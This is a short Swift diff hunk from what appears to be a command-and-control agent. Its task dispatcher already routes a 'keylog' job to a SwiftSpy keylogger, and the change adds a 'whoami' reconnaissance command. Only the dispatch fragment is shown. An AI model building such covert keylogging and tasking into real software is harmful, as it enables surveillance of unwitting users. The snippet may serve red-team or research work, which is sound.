@@ -226,6 +226,8 @@ func executeTask(job: Job, jobList: JobList) {
             let swiftSpy = SwiftSpy()
             swiftSpy.keylog(job: job)
         }
+    case "whoami":
+        whoami(job: job)
     default:
         job.result = "Command not implemented."
         job.status = "error"
